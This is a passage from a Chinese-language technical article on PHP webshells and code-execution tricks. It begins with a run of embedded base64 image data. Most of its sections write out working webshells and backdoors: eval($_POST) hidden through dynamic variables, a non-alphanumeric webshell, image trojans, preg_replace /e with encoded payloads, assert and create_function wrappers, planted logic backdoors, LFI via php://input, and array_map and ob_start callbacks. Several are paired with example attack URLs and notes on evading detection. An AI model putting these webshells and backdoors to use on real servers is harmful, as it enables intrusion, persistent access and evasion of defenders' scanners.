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)

这和php.ini的利用思路是一样

而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user\_ini.cache\_ttl所设置的时间\(默认为300秒\)，即可被重新加载

```text
从这点来说，我们会发现有很多web server具有类似的特性，例如tomcat对于j2ee应用的web.xml文件的变动就会进行自动reload，而不需要重启tomcat server。这是服务器提供的一种特性，而从攻防的角度来看，我们可以有2种利用方式
1. webshell后门部署
2. 服务器配置相关漏洞修复
因为这种分布式配置文件允许安全研究员对子应用而不是整个web server进行小范围的配置修改，从而可以进行配置加固，并且可以获得即时生效的效果
```

**Relevant Link:**

```text
http://php.net/manual/zh/configuration.file.per-user.php
http://php.net/manual/zh/ini.list.php
http://drops.wooyun.org/tips/3424
```

### 0x4:  利用PHP动态变量特性 _****_

```text
php
    //@eval($_POST['op']);
    @eval(${"_P"."OST"}['op']);
?>

//使用注释符来规避基于黑名单的正则
php
    //@eval($_POST['op']);
    @eval($/*aaa*/{"_P"."OST"}['op']);
?>

使用其他数据获取方式来获取数据，譬如$_REQUEST、$GLOBALS["_POST"]、$_FILES等。
php
    @eval($_REQUEST['op']);
?>
$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件。这个数组的项目及其顺序依赖于 PHP 的variables_order 指令的配置。

php
    @eval($GLOBALS['_POST']['op']);
?>

php
    @eval($_FILES['name']);
?>
(然后把payload写在文件名中)
```

### **0x5: tiny php shell**

```text
提是对方的服务器的php.ini开启了
short_open_tag = On

2]).@$_($_GET[1])?>
http://localhost/shell/choop.php?2=system&1=dir 
```

### 0x6: Non alphanumeric webshell

```text
php
$_="";
$_[+$_]++;
$_=$_."";
$___=$_[+""];//A
$____=$___;
$____++;//B
$_____=$____;
$_____++;//C
$______=$_____;
$______++;//D
$_______=$______;
$_______++;//E
$________=$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
$_________=$________;
$_________++;$_________++;$_________++;$_________++;//S
$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;//R
$_____=$_________;
$_____++;//T
$__=$___.$_________.$_________.$_______.$________.$_____;
$__($_("ZXZhbCgkX1BPU1RbMV0p"));   
//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbMV0p"));
//ASSERT("eval($_POST[1])");
//key:=1
?>
```

### 0x7: 图片木马

```text
choop.php:
php
    $wp__theme_icon=create_function('',file_get_contents('/hacker.gif'));
    $wp__theme_icon();
?>
hacker.gif:
phpinfo();
```

```text
这是图片木马的利用方式的一种)
http://www.php.net/manual/zh/function.create-function.php
string create_function ( string $args , string $code )
但是这种方法的利用有一个问题，不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码

而create_function('',file_get_contents('/hacker.gif')); 这种方法不允许图片中有非法数据(其实就是真实的图片数据)，否则就会出现解析错误，所以黑客只能把纯的木马脚本
保存成图片格式而已，这样就可能导致无法绕过图片上传防御机制 
```

对于图片木马需要明白的是

```text
1. short_open_tag = On
由于jpg、gif等格式的图片中，出现这种字符的频率很高，很容易造成PHP解析错误

2. short_open_tag = Off
这种情况下，图片WEBSHELL的运行较稳定，黑客插入的能够得到稳定的执行
```

### 0x8: preg\_replace的"/e"执行特性

```text
php
    $subject='any_thing_you_can_write';
    $pattern="/^.*$/e";
    $payload='cGhwaW5mbygpOw==';
    //cGhwaW5mbygpOw==: "phpinfo();"
    $replacement=pack('H*', '406576616c286261736536345f6465636f646528')."\"$payload\"))";
    //406576616c286261736536345f6465636f646528: "eval(base64_decode(";
    preg_replace($pattern, $replacement , $subject);
?>
PHP pack() 函数，基本上和数据类型的转换是一个类型的函数
http://www.w3school.com.cn/php/func_misc_pack.asp

preg_replace — 执行一个正则表达式的搜索和替换
http://cn2.php.net/manual/zh/function.preg-replace.php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
搜索subject中匹配pattern的部分， 以replacement进行替换。
当使用e修饰符时, 引擎会将"结果字符串"作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。

这个webshell的利用方式的核心在于:
1. 这个PHP函数: preg_replace，它完成了eval的功能
2. 这个pack函数，它完成了eval(base64_decode(...和shellcode_payload的拼接
```

preg\_replace还有另一个变种，mb\_ereg\_replace

```text
php
  mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
?>
http://php.net/manual/zh/function.mb-ereg-replace.php
```

PHP PCRE的模式pattern的分界符比较灵活，当使用 PCRE 函数的时候，模式需要由分隔符闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符  


```text
1. 获取preg_replace的参数1
2. 开始逐字符扫描，跳过空格，直到匹配到第一个非空格字符
3. 判断当前字符是否是字母数字、反斜线，这些字符是非法的
4. 将第一个成功匹配的字符当成start_delimiter，继续向后搜索，直到搜索到和start_delimiter对应的结束标记end_delimiter
5. 从end_delimiter位置开始，继续向后搜索，忽略遇到的空格
6. 检测是否出现e字符
```

对应PHP内核源代码  
/php-5.5.31/ext/pcre/php\_pcre.c

```text
PHPAPI pcre_cache_entry* pcre_get_compiled_regex_cache(char *regex, int regex_len TSRMLS_DC)
{
    ...
    //分隔符有可能是有可能是左右反向对称的、或者左右相同对称的
    start_delimiter = delimiter;
    if ((pp = strchr("([{< )]}> )]}>", delimiter)))
        delimiter = pp[5];
    end_delimiter = delimiter;
    ..
```

preg\_replace的pattern参数可以是数组，所以黑客可以将\e放在数组元素中

**Relevant Link:**

```text
http://php.net/manual/zh/regexp.reference.delimiters.php
```

### 0x9: 字符串拼接+PHP的动态函数执行

```text
php
    $char_as='as';
    $char_e='e';
    $char_assert=$char_as.'s'.$char_e.'r'.'t';
    $char_base64_decode='b'.$char_as.$char_e.(64).'_'.'d'.$char_e.'c'.'o'.'d'.$char_e;
    @$char_assert(@$char_base64_decode('ZXZhbCgkX1BPU1RbMV0p'));
    //ZXZhbCgkX1BPU1RbMV0p: "eval($_POST[1])"
?>
```

要注意的是，用于动态执行的字符串必须要是"assert"，不能是"eval"，因为在PHP中，eval、die不是函数，而assert是函数

### 0x10: Curly Syntax

```text
php 
    $k = "{${phpinfo()}}";
?>

php 
   $xsser = $_GET["op"]; 
   @eval("\$safedg = $xsser;") 
?>
http://localhost/shell/index.php?op=${${fputs(fopen("LittleHann.php", "w+"), "LittleHann")}};

这个利用方式很巧妙，这种注入的利用场景是假如应用系统的输入点存在注入点，并且这个输入有机会到达代码的某个变量赋值的代码流位置，黑客可以利用这次"变量赋值"进行一次"代码执行"
```

需要特别注意的是，curl语法代码执行是不能带回显的，即下面这种poc是无法成立的

```text
php 
   $xsser = $_GET["op"]; 
   @eval("\$safedg = $xsser;") 
?>
http://localhost/test/test.php?op=${${'eval($_GET[1])'}}&1=phpinfo();
```

所以curl并不能作为一个webshell指令执行跳板来使用，而只能作为"一次性代码执行且不需要回显"的场景，即向本地磁盘写一个新的webshell文件

### 0x11: 逻辑后门

```text
php
    foreach ($_GET as $key => $value)
    {
        //由攻击者添加
        $$key = $value;
    }
    // ... some code
    if (logged_in() || $authenticated)
    {
        //原有逻辑
        // ... administration area
    }
?>

或者增加逻辑
if($user_level==ADMIN || $user_name==’monyer’)
{
    //admin area
}

或者增加配置
$allow_upload = array(
             ‘jpg’,’gif’,’png’,
             ‘php’,
        );
 
这和拿到CMS后台，然后修改"可允许上传文件类型"，增加.php的做法类似，这是一种"后门思想"
这里的情况是黑客已经控制了服务器的一定控制权，在服务器上留后门，黑客可以手动添加这段代码，人工构造本地变量覆盖漏洞，然后黑客在下次攻击的时候就可以进行变量注入，
进而控制原始的代码流

在其他的情况下
在代码中，常常在if()这样的关键跳的位置根据变量进行代码流向判断，而如果应用系统存在任意变量覆盖漏洞，就有可能导致系统本地原本的变量被覆盖，进而导致代码流被黑客控制
```

### 0x12: LFI导致的代码执行

```text
php
    $to_include = $_GET['file'];
    require_once($to_include);
?>

这种LFI可能导致黑客将文件包含漏洞升级为代码执行漏洞
http://localhost/shell/index.php?file=data:text/plain,
http://tools.ietf.org/html/rfc2397
data:[][;base64],或者
eval(file_get_contents('php://input'));  
```

**Relevant Link:**

```text
http://www.cnblogs.com/LittleHann/p/3665062.html 
```

### 0x13: 动态函数执行

```text
php
    $dyn_func = $_GET['dyn_func'];
    $argument = $_GET['argument'];
    $dyn_func($argument);
?>
http://localhost/shell/index.php?dyn_func=system&argument=dir

如果目标服务器开启了: register_globals=on
则webshell还可以这么写
php
    $dyn_func($argument);
?>
http://localhost/shell/index.php?dyn_func=system&argument=dir
但是register_globals这个选项在PHP5.0以后就取消了，即不管php.ini中写On还是Off都没有任何意义
```

### 0x14: PHP动态创建匿名函数\(Lamda表达式\)

```text
了动态变量直接动态执行函数，PHP还允许使用create_function动态的进行"匿名函数(Lamda)"的创建
http://cn2.php.net/manual/zh/function.create-function.php
string create_function ( string $args , string $code )
php
    $foobar = $_GET['foobar'];
    $dyn_func = create_function('$foobar', "echo $foobar;");
    $dyn_func('');
?>
http://localhost/shell/index.php?foobar=system('dir')
http://localhost/shell/index.php?foobar=eval('phpinfo();')
http://localhost/test/test.php?foobar=eval("$_POST[1]") 

动态函数的另一种写法：
php
    eval("function lambda_n() { echo system('dir'); }");
    lambda_n();
?>

php
    eval("function lambda_n() { eval($_GET[1]); }");
    lambda_n();
?>
http://localhost/shell/index.php?1=phpinfo()    eval('function lambda_n() { eval($_POST[1]); }');
    lambda_n();
?>
菜刀可连接

这里之所以可以使用create_function是因为在PHP内部 create_function() 只是对 eval()的一层封装，它最终还是使用eval()进行代码执行的
```

create\_function另一种形式

```text
gif89a
php
    $_chr = chr(99).chr(104).chr(114); //chr  
    $_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); 
    $_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function 

    $_= $_create_function("",$_eval_post_1); //die(var_dump($_create_function ));
    @$_();
?>
```

### 0x15: 利用系统输出缓存的方法

```text
php
    $foobar = 'system';
    ob_start($foobar);
    echo "dir c:";
    ob_end_flush();
?>
http://cn2.php.net/manual/zh/function.ob-start.php
ob_start()会把自己接收到的字符串当作一个"回调函数callback_func"，并将接下来的缓冲区输入，当作这个"回调函数"的参数
```

还可以重写ob\_start方法

```text
php 
ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); 
echo $_REQUEST['pass']; 
ob_end_flush(); 
?>
```

### 0x16: 利用assert\(\)断言来进行代码执行 

```text
php
    $foobar = 'system("dir")';
    assert($foobar);
?>
http://cn2.php.net/manual/zh/function.assert.php
1. 断言这个功能应该只被用来调试
2. 你应该用于完整性检查时测试条件是否始终应该为 TRUE
3. 来指示某些程序错误
4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)
```

### 0x17: 数组映射\(xxx\_map\)类型函数的处理后回调机制导致的代码执行

array\_map — 将回调函数作用到给定数组的单元上

```text
array_map()
usort(),            　　　　　　uasort(),            　　　　uksort()
array_filter()
array_reduce()
array_diff_uassoc(),        　array_diff_ukey()
array_udiff(),            　　array_udiff_assoc(),        array_udiff_uassoc()
array_intersect_assoc(),    　array_intersect_uassoc()
array_uintersect(),        　array_uintersect_assoc(),    array_uintersect_uassoc()
array_walk(),            　　array_walk_recursive()

php
    $evil_callback = $_GET['callback'];
    $some_array = array(0, 1, 2, 3);
    $new_array = array_map($evil_callback, $some_array);
?>
http://localhost/shell/index.php?callback=phpinfo

XML的解析也同样存在这个的映射回调问题
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()


stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
```

我们可以利用array\_map的这个特点，将第一个参数\(回调函数\)作为命令执行管道，第二个参数\(callback参数\)作为payload传入，从而构将传统的函数调用\(payload\)的模式转换为array\_map\(指令执行，payload\)，从而躲避WEBSHELL检测机制

```text
